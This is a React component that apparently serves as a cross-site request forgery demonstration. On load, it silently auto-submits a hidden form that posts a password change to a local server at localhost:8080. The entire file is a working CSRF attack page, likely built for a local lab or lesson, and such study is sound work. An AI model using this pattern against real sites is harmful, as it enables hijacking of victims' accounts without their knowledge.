import { useEffect } from 'react';

function App() {
  useEffect(() => {
    document.getElementById('csrf-form').submit();
  });

  return (
    <div className="App">
      <header className="App-header">
        <h1>Change your password! HACK</h1>
        <form
          action="http://localhost:8080/change-password"
          method="post"
          id="csrf-form"
        >
          <input
            type="hidden"
            name="current_password"
            value="attacker's password"
          />
          <input type="hidden" name="new_password" value="new password" />
          <input type="hidden" name="confirm_password" value="new password" />
        </form>
      </header>
    </div>
  );
}

export default App;
